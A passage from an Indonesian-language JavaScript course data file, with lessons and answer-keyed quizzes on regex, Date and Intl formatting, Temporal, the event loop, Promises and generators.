        {"tanya":"Manakah keuntungan utama menggunakan Named Capture Groups /(?<tahun>\\d{4})-(?<bulan>\\d{2})/ dibandingkan grup tangkapan tanpa nama /(\\d{4})-(\\d{2})/?","opsi":["Membuat eksekusi regex berjalan 10 kali lebih cepat.","Hasil ekstraksi dapat diakses langsung melalui nama properti yang deskriptif pada hasil.groups.tahun dan hasil.groups.bulan, sehingga kode lebih mudah dibaca dan tidak rusak apabila urutan atau jumlah grup di dalam regex berubah.","Menghilangkan kebutuhan penggunaan tanda garis miring /.","Mengubah hasil tangkapan menjadi tipe Number secara otomatis."],"benar":1,"penjelasan":"Dengan Named Capture Groups, setiap tangkapan dipetakan ke dalam objek match.groups sesuai namanya, menggantikan ketergantungan pada indeks angka match[1], match[2] yang rawan bergeser saat pola dimodifikasi."},
        {"tanya":"Syarat apakah yang wajib dipenuhi oleh objek RegExp yang dikirimkan sebagai argumen ke metode teks.matchAll(regex)?","opsi":["Regex tersebut wajib memiliki bendera global (g), jika tidak matchAll() akan melempar TypeError.","Regex tersebut tidak boleh memiliki grup tangkapan (...).","Regex tersebut hanya boleh berisi huruf kecil.","Regex tersebut harus dibuat menggunakan new RegExp()."],"benar":0,"penjelasan":"Spesifikasi ECMAScript mewajibkan argumen RegExp pada String.prototype.matchAll() memiliki flag g (global); memanggil matchAll() dengan regex non-global akan langsung melempar TypeError."},
        {"tanya":"Apa penyebab terjadinya kerentanan Regular Expression Denial of Service (ReDoS) pada pola seperti /^([a-z]+)+$/?","opsi":["Penggunaan kelas karakter [a-z].","Kuantifier berulang yang bersarang (+ di dalam +) menyebabkan ledakan kombinasi jalur pencocokan secara eksponensial (catastrophic backtracking) ketika diberi string panjang yang gagal cocok di bagian akhir, sehingga membekukan utas tunggal JavaScript.","Penggunaan jangkar ^ dan $.","Tidak adanya flag i."],"benar":1,"penjelasan":"Mesin RegExp berbasis backtracking akan mencoba semua kemungkinan cara memecah string di antara kuantifier dalam dan luar sebelum menyerah. Menghindari kuantifier bersarang yang ambigu dan membatasi panjang input sebelum validasi regex adalah kunci pencegahan ReDoS."}
    ]
},
{
    id: 9,
    kategori: "2 · Objek & Data",
    judul: "Penanganan Tanggal, Zona Waktu, Intl API, dan Pengantar Temporal",
    tingkat: "Menengah", durasi: "9 mnt",
    tag: ["Intl","Temporal","Date"],
    ringkas: "Mengelola waktu dengan aman menggunakan format ISO 8601 (UTC), memformat tanggal, mata uang Rupiah, selisih waktu relatif (\"3 hari yang lalu\"), dan daftar kalimat secara presisi menggunakan API bawaan Intl, serta mengenal objek modern Temporal.",
    isi: `
<h2>1. Aturan Emas Menangani Tanggal dan Waktu (<code>Date</code>) di Aplikasi Web</h2>
<p>Objek bawaan <code>Date</code> di JavaScript sebenarnya menyimpan satu angka sederhana di balik layar: **jumlah milidetik yang telah berlalu sejak 1 Januari 1970 00:00:00 UTC (<em>Unix Epoch</em>)**.</p>
<p>Namun, <code>new Date()</code> memiliki beberapa jebakan warisan tahun 1995 yang wajib Anda waspadai:</p>
<ol><li><strong>Indeks Bulan Dimulai dari <code>0</code> (<code>0</code> = Januari, <code>11</code> = Desember), sedangkan Tanggal Hari Dimulai dari <code>1</code>!</strong> Menulis <code>new Date(2026, 10, 16)</code> <strong>bukanlah</strong> 16 Oktober 2026, melainkan <strong>16 November 2026</strong>!</li><li><strong>Perbedaan Penguraian String Tanggal:</strong><ul><li>Selalu gunakan format standar <strong>ISO 8601 lengkap dengan zona waktu</strong> saat bertukar data antara klien dan server: <strong><code>&quot;2026-10-16T07:30:00.000Z&quot;</code></strong> (akhiran <code>Z</code> berarti UTC) atau <strong><code>&quot;2026-10-16T14:30:00+07:00&quot;</code></strong> (WIB).</li><li>Gunakan <code>new Date().toISOString()</code> untuk menghasilkan string waktu UTC standar yang siap dikirim ke API/database.</li></ul></li></ol>
<pre>const sekarang = new Date(&quot;2026-10-16T07:30:00.000Z&quot;);

// Mendapatkan timestamp milidetik saat ini secara cepat:
const capWaktuMs = Date.now();
console.log(sekarang.toISOString()); // &quot;2026-10-16T07:30:00.000Z&quot;</pre>
<h2>2. Kekuatan API Internasionalisasi Bawaan (<code>Intl</code>) — Tanpa Pustaka Berat!</h2>
<p>Di masa lalu, pengembang sering memasang pustaka tanggal dan pemformatan berukuran ratusan kilobyte hanya untuk menampilkan <code>&quot;Jumat, 16 Oktober 2026&quot;</code>, <code>&quot;Rp 1.250.000&quot;</code>, atau <code>&quot;2 jam yang lalu&quot;</code>.</p>
<p>Kini, mesin JavaScript di semua peramban dan Node.js sudah memiliki namespace bawaan <strong><code>Intl</code> (ECMA-402)</strong> yang sangat cepat, akurat untuk Bahasa Indonesia (<code>&quot;id-ID&quot;</code>), dan berukuran <code>0 KB</code>!</p>
<h3>A. Memformat Tanggal dan Zona Waktu (<code>Intl.DateTimeFormat</code>)</h3>
<p>Anda bahkan dapat menentukan <strong><code>timeZone: &quot;Asia/Jakarta&quot;</code></strong> (WIB), <code>&quot;Asia/Makassar&quot;</code> (WITA), atau <code>&quot;Asia/Jayapura&quot;</code> (WIT) secara eksplisit agar tampilan waktu selalu konsisten:</p>
<pre>const waktuServer = new Date(&quot;2026-10-16T07:30:00Z&quot;);

const pemformatTanggalWib = new Intl.DateTimeFormat(&quot;id-ID&quot;, {
  dateStyle: &quot;full&quot;,
  timeStyle: &quot;short&quot;,
  timeZone: &quot;Asia/Jakarta&quot;
});

console.log(pemformatTanggalWib.format(waktuServer));
// Keluaran: &quot;Jumat, 16 Oktober 2026 pukul 14.30&quot;</pre>
<h3>B. Memformat Mata Uang Rupiah, Persentase, dan Angka Ringkas (<code>Intl.NumberFormat</code>)</h3>
<pre>// 1. Format Mata Uang Rupiah
const formatRupiah = new Intl.NumberFormat(&quot;id-ID&quot;, {
  style: &quot;currency&quot;,
  currency: &quot;IDR&quot;,
  maximumFractionDigits: 0
});
console.log(formatRupiah.format(1250000)); // &quot;Rp 1.250.000&quot;

// 2. Format Angka Ringkas (mis. untuk jumlah tayangan &quot;1,2 rb&quot; atau &quot;3,5 jt&quot;)
const formatRingkas = new Intl.NumberFormat(&quot;id-ID&quot;, {
  notation: &quot;compact&quot;,
  compactDisplay: &quot;short&quot;
});
console.log(formatRingkas.format(14500)); // &quot;15 rb&quot; (bawaannya dibulatkan ke dua digit signifikan; tambahkan maximumFractionDigits: 1 untuk &quot;14,5 rb&quot;)</pre>
<h3>C. Waktu Relatif (<code>Intl.RelativeTimeFormat</code>) dan Daftar Kalimat (<code>Intl.ListFormat</code>)</h3>
<pre>// 1. Menampilkan &quot;3 hari yang lalu&quot; atau &quot;dalam 2 bulan&quot;
const formatRelatif = new Intl.RelativeTimeFormat(&quot;id-ID&quot;, { numeric: &quot;auto&quot; });
console.log(formatRelatif.format(-1, &quot;day&quot;));   // &quot;kemarin&quot;
console.log(formatRelatif.format(-3, &quot;day&quot;));   // &quot;3 hari yang lalu&quot;
console.log(formatRelatif.format(2, &quot;hour&quot;));   // &quot;dalam 2 jam&quot;

// 2. Menggabungkan array menjadi kalimat alami dengan kata hubung &quot;dan&quot; / &quot;atau&quot;
const formatDaftar = new Intl.ListFormat(&quot;id-ID&quot;, {
  style: &quot;long&quot;,
  type: &quot;conjunction&quot;
});
console.log(formatDaftar.format([&quot;HTML&quot;, &quot;CSS&quot;, &quot;JavaScript&quot;, &quot;PHP&quot;]));
// Keluaran: &quot;HTML, CSS, JavaScript, dan PHP&quot;</pre>
<div class="callout info"><div class="callout-judul">💡 Tips Performa Penting untuk <code>Intl</code></div><p>Membuat instans <code>new Intl.DateTimeFormat(...)</code> atau <code>new Intl.NumberFormat(...)</code> membutuhkan pembacaan tabel bahasa di awal. Jika Anda memformat 1.000 baris di dalam tabel, <strong>buat objek formatter-nya satu kali di luar perulangan</strong>, lalu panggil metode <code>.format(...)</code> di dalam perulangan (jauh lebih cepat daripada memanggil <code>.toLocaleString()</code> berulang-ulang di setiap baris!).</p></div>
<h2>3. Masa Depan Tanggal di JavaScript: Mengenal Objek <code>Temporal</code></h2>
<p>Karena objek <code>Date</code> klasik bersifat <em>mutable</em> (memanggil <code>tanggal.setMonth(5)</code> mengubah objek aslinya di tempat!) dan tidak memisahkan konsep &quot;Tanggal Kalender Murni tanpa Jam&quot; dari &quot;Titik Waktu Zona Tertentu&quot;, TC39 menghadirkan API global baru bernama <strong><code>Temporal</code></strong> (sudah didukung Chrome/Edge 144+ dan Firefox 139+, tetapi belum Baseline karena Safari belum merilisnya; Node.js 24 juga belum mengaktifkannya secara bawaan):</p>
<ul><li>Semua objek <code>Temporal</code> bersifat <strong>100% Immutable</strong> (seperti <code>DateTimeImmutable</code> di PHP).</li><li>Indeks bulan dimulai secara wajar dari <strong><code>1</code> (Januari) hingga <code>12</code> (Desember)</strong>!</li><li>Memisahkan tipe dengan tegas:<ul><li><code>Temporal.Now.instant()</code> (titik waktu eksak UTC)</li><li><code>Temporal.PlainDate.from(&quot;2026-10-16&quot;)</code> (tanggal kalender murni, misalnya tanggal lahir atau hari libur)</li><li><code>Temporal.ZonedDateTime</code> (waktu lengkap dengan zona waktu IANA seperti <code>[Asia/Jakarta]</code>).</li></ul></li></ul>
<pre>// Penggunaan progresif Temporal jika sudah tersedia di lingkungan runtime:
if (&quot;Temporal&quot; in globalThis) {
  const hariIni = Temporal.PlainDate.from(&quot;2026-10-16&quot;);
  const mingguDepan = hariIni.add({ days: 7 });
  console.log(mingguDepan.toString()); // &quot;2026-10-23&quot; (hariIni tetap utuh &quot;2026-10-16&quot;!)
}</pre>
<h2>Latihan Praktik: Modul Utilitas Pemformatan Lokal Indonesia</h2>
<p>Buatlah berkas <code>lokalisasi-id.js</code> dan jalankan dengan Node.js:</p>
<ol><li>Buat satu instans <code>Intl.NumberFormat</code> untuk Rupiah, satu <code>Intl.DateTimeFormat</code> untuk zona waktu <code>&quot;Asia/Jakarta&quot;</code>, dan satu <code>Intl.ListFormat</code>.</li><li>Buat fungsi <code>formatKartuKursus({ judul, harga, diperbaruiPada, prasyarat })</code> yang mengembalikan objek dengan harga berformat Rupiah, tanggal pembaruan berformat WIB, dan daftar prasyarat yang dirangkai menjadi kalimat Bahasa Indonesia yang rapi.</li></ol>
<div class="callout info"><div class="callout-judul">📚 Rujukan</div><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Intl" rel="noopener"><code>Intl</code> — MDN Web Docs</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Date" rel="noopener"><code>Date</code> — MDN Web Docs</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Temporal" rel="noopener"><code>Temporal</code> — MDN Web Docs</a></li><li><a href="https://tc39.es/ecma262/multipage/numbers-and-dates.html" rel="noopener">Numbers and Dates — TC39 ECMAScript Specification</a></li></ul></div>
`,
    perintah: ["Date","Intl","Temporal","0","1","Intl.DateTimeFormat"],
    kuis: [
        {"tanya":"Tanggal berapakah yang direpresentasikan oleh pemanggilan konstruktor new Date(2026, 0, 15) di JavaScript?","opsi":["15 Oktober 2026","15 Januari 2026","1 Januari 2026","Melempar RangeError karena bulan tidak boleh bernilai 0."],"benar":1,"penjelasan":"Pada konstruktor new Date(year, monthIndex, day) klasik di JavaScript, parameter kedua (monthIndex) berbasis nol (0 = Januari, 1 = Februari, ..., 11 = Desember), sedangkan parameter tanggal hari (day) dimulai dari 1."},
        {"tanya":"Mengapa saat memformat 500 angka harga barang di dalam perulangan kita disarankan membuat const fmt = new Intl.NumberFormat(\"id-ID\", ...) satu kali di luar perulangan lalu memanggil fmt.format(harga), daripada memanggil harga.toLocaleString(\"id-ID\", ...) di setiap iterasi?","opsi":["Karena toLocaleString() tidak mendukung mata uang IDR.","Karena harga.toLocaleString() harus menginisialisasi konfigurasi lokalisasi berulang kali pada setiap putaran perulangan, sedangkan membuat instans Intl.NumberFormat satu kali memungkinkan penggunaan ulang mesin pemformat yang sama dengan sangat cepat.","Karena toLocaleString() selalu membulatkan angka ke ribuan terdekat.","Karena Intl.NumberFormat berjalan di sisi server."],"benar":1,"penjelasan":"Inisialisasi objek Intl.*Format memuat aturan lokal dan simbol mata uang ke memori. Menyimpan instansnya di sebuah konstanta dan memanggil .format() berulang kali menghindari biaya inisialisasi berulang."},
        {"tanya":"Kelas bawaan manakah dari namespace Intl yang dirancang khusus untuk mengubah array [\"HTML\", \"CSS\", \"JavaScript\"] menjadi string \"HTML, CSS, dan JavaScript\" sesuai kaidah tanda baca bahasa tujuan?","opsi":["Intl.PluralRules","Intl.ListFormat","Intl.Segmenter","Intl.Collator"],"benar":1,"penjelasan":"Intl.ListFormat memformat daftar item dengan kata hubung yang tepat sesuai bahasa dan tipe yang dipilih (type: \"conjunction\" untuk \"dan\", atau type: \"disjunction\" untuk \"atau\")."}
    ]
},
{
    id: 10,
    kategori: "3 · Asinkron & Iterasi",
    judul: "Event Loop, Antrean Microtask, Promise, dan async / await",
    tingkat: "Lanjut", durasi: "10 mnt",
    tag: ["Promise","async","await"],
    ringkas: "Membedah bagaimana JavaScript yang single-threaded menangani ribuan operasi asinkron tanpa membeku melalui mekanisme Event Loop (Call Stack, Task Queue vs Microtask Queue), mengelola siklus hidup Promise, konkurensi Promise.all / allSettled, serta sintaks async/await.",
    isi: `
<h2>Mengapa JavaScript yang <em>Single-Threaded</em> Tidak Membeku Saat Mengambil Data Jaringan?</h2>
<p>Mesin utama JavaScript menjalankan kode Anda pada **satu utas tunggal (<em>Single Thread / Satu Call Stack</em>)**: pada satu detik yang sama, ia hanya bisa mengeksekusi satu baris perintah JavaScript.</p>
<p>Lalu bagaimana peramban tetap bisa menggulir halaman dengan mulus dan merespons klik tombol sementara program sedang menunggu balasan API dari server yang memakan waktu 2 detik?</p>
<p>Jawabannya adalah kolaborasi antara <strong>Call Stack</strong>, <strong>Host/Web APIs</strong> milik peramban (atau libuv di Node.js), <strong>Microtask Queue</strong>, <strong>Task (Macrotask) Queue</strong>, dan sang pengatur lalu lintas yang disebut <strong>Event Loop</strong>:</p>
<pre>+------------------------+      +---------------------------------------+
|      CALL STACK        |      |       WEB APIs / RUNTIME HOST         |
| (Menjalankan fungsi JS | ---&gt; | (Timer setTimeout, Jaringan fetch(),  |
|  satu per satu)        |      |  Pendengar DOM addEventListener)      |
+------------------------+      +---------------------------------------+
            ^                                       │
            │                              (Setelah selesai:)
    [ EVENT LOOP ]                                  ▼
            │                   +---------------------------------------+
            ├────── Prioritas 1 │ MICROTASK QUEUE                       |
            │       (Habiskan   | (Callback Promise .then/catch/finally,|
            │        semua!)    |  kelanjutan baris setelah await,      |
            │                   |  queueMicrotask)                      |
            │                   +---------------------------------------+
            │                   +---------------------------------------+
            └────── Prioritas 2 │ TASK / MACROTASK QUEUE                |
                    (Ambil satu | (Callback setTimeout, setInterval,    |
                     per satu)  |  Event klik/papan ketik DOM)          |
                                +---------------------------------------+</pre>
<h3>Aturan Emas Urutan Eksekusi Event Loop:</h3>
<ol><li>Jalankan semua kode <strong>sinkron</strong> yang ada di dalam <strong>Call Stack</strong> sampai Call Stack benar-benar kosong.</li><li>Begitu Call Stack kosong, Event Loop memeriksa <strong>Microtask Queue</strong> terlebih dahulu dan <strong>menjalankan seluruh microtask sampai antrean microtask benar-benar habis</strong> (termasuk microtask baru yang ditambahkan oleh microtask tadi!).</li><li>Setelah Microtask Queue kosong, barulah Event Loop mengambil <strong>satu tugas dari Task (Macrotask) Queue</strong> (misalnya callback <code>setTimeout</code>), memasukkannya ke Call Stack, lalu kembali lagi ke langkah 2!</li></ol>
<p>Mari kita buktikan dengan menebak urutan keluaran kode berikut:</p>
<pre>console.log(&quot;1. Sinkron Awal&quot;);

setTimeout(() =&gt; {
  console.log(&quot;4. Macrotask (setTimeout 0ms)&quot;);
}, 0);

Promise.resolve().then(() =&gt; {
  console.log(&quot;3. Microtask (Promise.then)&quot;);
});

console.log(&quot;2. Sinkron Akhir&quot;);

// Urutan yang tercetak di layar SELALU:
// 1. Sinkron Awal
// 2. Sinkron Akhir
// 3. Microtask (Promise.then)   &lt;-- Dijalankan LEBIH DULU daripada setTimeout 0ms!
// 4. Macrotask (setTimeout 0ms)</pre>
<h2>2. Memahami <code>Promise</code> dan Tiga Status Siklus Hidupnya</h2>
<p>Sebuah <strong><code>Promise</code></strong> adalah objek yang mewakili hasil akhir dari operasi asinkron yang sedang berlangsung. Setiap <code>Promise</code> selalu berada dalam salah satu dari tiga kondisi (<em>states</em>):</p>
<ol><li><strong><code>pending</code> (Menunggu):</strong> Operasi masih berjalan.</li><li><strong><code>fulfilled</code> (Berhasil):</strong> Operasi tuntas dengan sebuah nilai hasil (<code>value</code>).</li><li><strong><code>rejected</code> (Gagal):</strong> Operasi gagal dengan sebuah alasan galat (<code>reason</code> / objek <code>Error</code>).</li></ol>
<p>Ketika sebuah Promise sudah berubah menjadi <code>fulfilled</code> atau <code>rejected</code>, ia disebut <strong><code>settled</code> (Tuntas)</strong> dan statusnya terkunci selamanya (tidak dapat berubah lagi).</p>
<pre>// Membungkus API berbasis callback lama (seperti setTimeout) menjadi Promise
function tunggu(milidetik) {
  return new Promise((resolve, reject) =&gt; {
    if (milidetik &lt; 0) {
      reject(new RangeError(&quot;Durasi waktu tunggu tidak boleh negatif.&quot;));
      return;
    }
    setTimeout(() =&gt; {
      resolve(\`Selesai menunggu selama \${milidetik} ms\`);
    }, milidetik);
  });
}</pre>
<div class="callout info"><div class="callout-judul">💡 Fitur Modern (Sejak ES2024): <code>Promise.withResolvers()</code></div><p>Jika Anda perlu mengekstrak fungsi <code>resolve</code> dan <code>reject</code> agar bisa dipanggil dari luar lingkup callback <code>new Promise(...)</code> (misalnya pada komponen pembatalan atau antrean event), kini Anda dapat menggunakan <strong><code>const { promise, resolve, reject } = Promise.withResolvers();</code></strong> (status <strong>Baseline Widely Available</strong>; didukung semua peramban utama sejak Maret 2024)!</p></div>
<h2>3. Menulis Kode Asinkron yang Bersih dengan <code>async</code> dan <code>await</code></h2>
<p>Sintaks <strong><code>async</code> / <code>await</code></strong> dibangun di atas <code>Promise</code> untuk membuat kode asinkron tampak dan mengalir selayaknya kode sinkron biasa:</p>
<ul><li>Menambahkan kata kunci <strong><code>async</code></strong> di depan fungsi menjamin fungsi tersebut <strong>selalu mengembalikan sebuah <code>Promise</code></strong>.</li><li>Kata kunci <strong><code>await</code></strong> menjeda eksekusi fungsi <code>async</code> tersebut (tanpa memblokir utas utama / Call Stack!) hingga <code>Promise</code> di sebelah kanannya selesai (<em>settled</em>). Jika <code>Promise</code> tersebut <em>rejected</em>, <code>await</code> akan melempar galatnya sehingga dapat ditangkap dengan blok <code>try...catch</code> standar!</li></ul>
<pre>async function muatRingkasanPengguna(idPengguna) {
  try {
    const pesan = await tunggu(200);
    return { idPengguna, status: pesan };
  } catch (galat) {
    console.error(&quot;Gagal memuat ringkasan:&quot;, galat.message);
    throw galat;
  }
}</pre>
<h2>4. Konkurensi <code>Promise</code>: Jangan Menjalankan <code>await</code> Berurutan Jika Bisa Paralel!</h2>
<p>Perhatikan jebakan performa paling sering saat menggunakan <code>async</code>/<code>await</code>:</p>
<pre>// LAMBAT (Berurutan / Sequential): Total waktu = 300ms + 300ms + 300ms = 900ms!
// Karena mengambil daftar kelas sama sekali tidak bergantung pada hasil profil,
// menunggu satu per satu membuang waktu pengguna secara percuma.
async function muatDasborLambat() {
  const profil    = await ambilData(&quot;/api/profil&quot;);     // 300ms
  const kelas     = await ambilData(&quot;/api/kelas&quot;);      // 300ms
  const notifikasi = await ambilData(&quot;/api/notifikasi&quot;); // 300ms
  return { profil, kelas, notifikasi };
}

// CEPAT (Paralel / Concurrent dengan Promise.all): Total waktu hanya ~300ms!
async function muatDasborCepat() {
  const [profil, kelas, notifikasi] = await Promise.all([
    ambilData(&quot;/api/profil&quot;),
    ambilData(&quot;/api/kelas&quot;),
    ambilData(&quot;/api/notifikasi&quot;)
  ]);
  return { profil, kelas, notifikasi };
}</pre>
<h3>Memilih Metode Kombinator <code>Promise</code> yang Tepat</h3>
<table><thead><tr><th>Metode</th><th>Kapan Selesai?</th><th>Apa yang Terjadi Jika Ada Satu saja yang Gagal (<em>Rejected</em>)?</th><th>Kasus Penggunaan Terbaik</th></tr></thead><tbody><tr><td><strong><code>Promise.all([...])</code></strong></td><td>Saat <strong>semua</strong> berhasil.</td><td>**Langsung gagal seketika (<em>fail-fast</em>)** dan membuang hasil lainnya.</td><td>Mengambil beberapa data yang <strong>semuanya wajib ada</strong> agar halaman bisa tampil.</td></tr><tr><td><strong><code>Promise.allSettled([...])</code></strong></td><td>Saat <strong>semua</strong> tuntas (baik berhasil maupun gagal).</td><td><strong>Tidak pernah gagal!</strong> Mengembalikan array objek <code>{ status: &quot;fulfilled&quot;, value }</code> atau <code>{ status: &quot;rejected&quot;, reason }</code>.</td><td>Mengambil widget dasbor independen (jika widget cuaca gagal, widget berita tetap tampil!).</td></tr><tr><td><strong><code>Promise.race([...])</code></strong></td><td>Saat Promise <strong>pertama</strong> tuntas (berhasil ataupun gagal).</td><td>Mengikuti hasil Promise tercepat pertama.</td><td>Membatasi waktu tunggu (<em>timeout</em>) sebuah operasi.</td></tr><tr><td><strong><code>Promise.any([...])</code></strong></td><td>Saat Promise **pertama berhasil (<em>fulfilled</em>)**.</td><td>Mengabaikan yang gagal; hanya melempar <code>AggregateError</code> jika <strong>semuanya gagal</strong>.</td><td>Mengambil aset dari beberapa server cermin (<em>mirror CDN</em>) tercepat.</td></tr></tbody></table>
<h2>Latihan Praktik: Mengambil Data Multi-Layanan secara Tangguh dengan <code>Promise.allSettled</code></h2>
<p>Buatlah berkas <code>asinkron-paralel.js</code> dan jalankan dengan Node.js:</p>
<ol><li>Buat fungsi <code>simulasiRequest(namaLayanan, waktuMs, harusGagal = false)</code> yang mengembalikan <code>Promise</code>.</li><li>Jalankan 3 permintaan sekaligus menggunakan <code>await Promise.allSettled([...])</code>: Layanan Profil (<code>100ms</code>, sukses), Layanan Rekomendasi (<code>150ms</code>, <strong>gagal</strong>), dan Layanan Progres (<code>80ms</code>, sukses).</li><li>Pisahkan hasil yang <code>status === &quot;fulfilled&quot;</code> dan <code>status === &quot;rejected&quot;</code> agar aplikasi tetap menampilkan data profil dan progres sambil mencatat peringatan untuk layanan rekomendasi!</li></ol>
<div class="callout info"><div class="callout-judul">📚 Rujukan</div><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Using_promises" rel="noopener">Using promises — MDN Web Docs</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Execution_model" rel="noopener">JavaScript execution model (Event loop) — MDN Web Docs</a></li><li><a href="https://tc39.es/ecma262/multipage/control-abstraction-objects.html" rel="noopener">Control abstraction objects (<code>Promise</code>) — TC39 ECMAScript Specification</a></li></ul></div>
`,
    perintah: ["Promise","await","async","fulfilled","rejected","setTimeout"],
    kuis: [
        {"tanya":"Mengapa callback di dalam Promise.resolve().then(...) selalu dieksekusi lebih dulu daripada callback di dalam setTimeout(..., 0) meskipun keduanya dijadwalkan pada waktu yang sama?","opsi":["Karena setTimeout(..., 0) secara otomatis diubah menjadi 1000ms oleh peramban.","Karena callback Promise masuk ke dalam Microtask Queue, sedangkan callback setTimeout masuk ke dalam Task (Macrotask) Queue; Event Loop selalu menguras habis seluruh antrean Microtask terlebih dahulu sebelum mengambil satu tugas dari Macrotask Queue.","Karena Promise berjalan di utas CPU yang berbeda dari JavaScript.","Karena setTimeout hanya dieksekusi ketika pengguna menggerakkan tetikus."],"benar":1,"penjelasan":"Dalam spesifikasi Event Loop, setiap kali Call Stack kosong, antrean Microtask (yang menampung penyelesaian Promise dan queueMicrotask) memiliki prioritas mutlak dan dikerjakan sampai habis sebelum Event Loop mengambil giliran Macrotask (setTimeout, setInterval, I/O)."},
        {"tanya":"Anda ingin memuat 3 panel informasi pada halaman beranda secara paralel. Jika salah satu panel gagal dimuat karena servernya sedang lambat, Anda tetap ingin menampilkan 2 panel lainnya yang berhasil. Kombinator Promise manakah yang paling tepat?","opsi":["Promise.all()","Promise.allSettled()","Promise.race()","Promise.any()"],"benar":1,"penjelasan":"Promise.all() bersifat fail-fast: jika satu saja Promise gagal, seluruh Promise.all() langsung melempar galat dan hasil dari 2 Promise lain yang berhasil tidak dikembalikan. Sebaliknya, Promise.allSettled() menunggu semua Promise selesai dan mengembalikan status serta nilai/alasan dari masing-masing Promise secara utuh."},
        {"tanya":"Apa yang dikembalikan oleh fungsi async function ambilAngka() { return 42; } ketika fungsi tersebut dipanggil dengan const hasil = ambilAngka(); (tanpa await)?","opsi":["Angka primitif 42 secara langsung.","Sebuah objek Promise yang berstatus fulfilled dengan nilai 42 (Promise {<fulfilled>: 42}).","Nilai undefined.","Sebuah fungsi generator."],"benar":1,"penjelasan":"Fungsi yang dideklarasikan dengan kata kunci async selalu membungkus nilai kembaliannya ke dalam sebuah objek Promise. Untuk membuka nilai 42 di dalamnya, pemanggil harus menggunakan await ambilAngka() atau ambilAngka().then(...)."}
    ]
},
{
    id: 11,
    kategori: "3 · Asinkron & Iterasi",
    judul: "Protokol Iterator, Fungsi Generator (function* / yield), dan for await...of",
    tingkat: "Lanjut", durasi: "8 mnt",
    tag: ["function*","yield","for await...of"],
    ringkas: "Memahami bagaimana perulangan for...of bekerja di balik layar melalui protokol Iterable/Iterator, menghasilkan deret data malas (lazy evaluation) yang hemat memori menggunakan fungsi Generator (function* dan yield), memanfaatkan Iterator Helpers baru, serta memproses aliran data asinkron dengan for await...of.",
    isi: `
<h2>1. Mengapa <code>Array</code>, <code>String</code>, <code>Map</code>, dan <code>Set</code> Semuanya Bisa Di-<code>for...of</code>?</h2>
<p>Pernahkah Anda bertanya bagaimana satu sintaks <code>for (const x of koleksi)</code> dan operator spread <code>[...koleksi]</code> dapat bekerja pada struktur data yang berbeda-beda seperti <code>Array</code>, <code>Map</code>, <code>Set</code>, hingga <code>NodeList</code>?</p>
<p>Jawabannya adalah karena semuanya mengimplementasikan <strong>Iterable Protocol</strong>:</p>
<ul><li>Sebuah objek disebut <strong>Iterable</strong> jika ia memiliki metode dengan kunci simbol khusus <strong><code>[Symbol.iterator]()</code></strong>.</li><li>Ketika <code>for...of</code> dijalankan, JavaScript memanggil <code>[Symbol.iterator]()</code> tersebut untuk mendapatkan objek <strong>Iterator</strong>, yaitu objek yang memiliki metode <strong><code>.next()</code></strong> yang pada setiap langkahnya mengembalikan <code>{ value: ..., done: false }</code> hingga berakhir di <code>{ value: undefined, done: true }</code>!</li></ul>
<h2>2. Fungsi Generator (<code>function*</code> dan <code>yield</code>): Evaluasi Malas (<em>Lazy Evaluation</em>)</h2>
<p>Membuat objek iterator secara manual dengan menulis metode <code>.next()</code> cukup bertele-tele. Sebagai gantinya, JavaScript menyediakan <strong>Generator Function (<code>function*</code>)</strong>!</p>
<p>Berbeda dengan fungsi biasa yang sekali dipanggil langsung berjalan sampai tuntas (<code>return</code>), fungsi generator (<code>function*</code>):</p>
<ol><li>Saat dipanggil, ia <strong>tidak langsung menjalankan kodenya</strong>, melainkan mengembalikan sebuah objek <strong>Generator (yang sekaligus merupakan Iterable dan Iterator)</strong>.</li><li>Setiap kali nilai berikutnya diminta (misalnya oleh putaran <code>for...of</code> atau <code>.next()</code>), fungsi berjalan sampai menemui kata kunci <strong><code>yield</code></strong>, menyerahkan nilai tersebut, lalu **membekukan posisinya (<em>pause</em>) tanpa memakan CPU** sampai nilai berikutnya diminta lagi!</li></ol>
<pre>// Menghasilkan urutan ID atau rentang angka secara malas (Lazy) —
// meskipun batasAkhir = 1_000_000_000, memori RAM yang terpakai hanya beberapa byte
// karena angka dibuat satu per satu saat dibutuhkan, BUKAN membuat Array 1 miliar elemen!
function* buatRentang(mulai, akhir, langkah = 1) {
  for (let angka = mulai; angka &lt;= akhir; angka += langkah) {
    yield angka;
  }
}

for (const n of buatRentang(10, 30, 10)) {
  console.log(n); // Mencetak 10, lalu 20, lalu 30
}</pre>
<h3><em>Iterator Helpers</em> Modern (Baseline Newly Available)</h3>
<p>Dulu, untuk melakukan <code>.map()</code>, <code>.filter()</code>, atau mengambil 5 elemen pertama (<code>.take(5)</code>) pada hasil generator, kita terpaksa mengubahnya menjadi <code>Array</code> dulu dengan <code>[...gen]</code> (yang menghilangkan keunggulan hemat memorinya!).</p>
<p>Kini, <code>Iterator.prototype</code> telah dilengkapi metode <strong>Iterator Helpers</strong> yang bekerja secara malas (<em>lazy</em>):</p>
<ul><li><strong><code>iterator.map(fn)</code></strong></li><li><strong><code>iterator.filter(fn)</code></strong></li><li><strong><code>iterator.take(jumlahMaks)</code></strong> dan <strong><code>iterator.drop(jumlahLewati)</code></strong></li><li><strong><code>iterator.toArray()</code></strong> (mengubah hasil akhirnya saja menjadi Array).</li></ul>
<pre>function* bilanganAsliMulaiDari(awal = 1) {
  let n = awal;
  while (true) {
    yield n++; // Perulangan tak terbatas yang 100% aman karena bersifat lazy!
  }
}

// Mengambil 4 bilangan kuadrat genap pertama dari deret tak terbatas:
const empatKuadratGenap = bilanganAsliMulaiDari(1)
  .filter((n) =&gt; n % 2 === 0)
  .map((n) =&gt; n * n)
  .take(4)
  .toArray();

console.log(empatKuadratGenap); // [4, 16, 36, 64]</pre>
<h2>3. Async Generators (<code>async function*</code>) dan <code>for await...of</code></h2>
<p>Bagaimana jika setiap langkah di dalam deret data membutuhkan operasi asinkron—seperti <strong>mengambil halaman API yang dipaginasi (<code>?page=1</code>, <code>?page=2</code>, <code>?page=3</code>) satu per satu</strong> atau membaca aliran respons (<em>ReadableStream</em>)?</p>
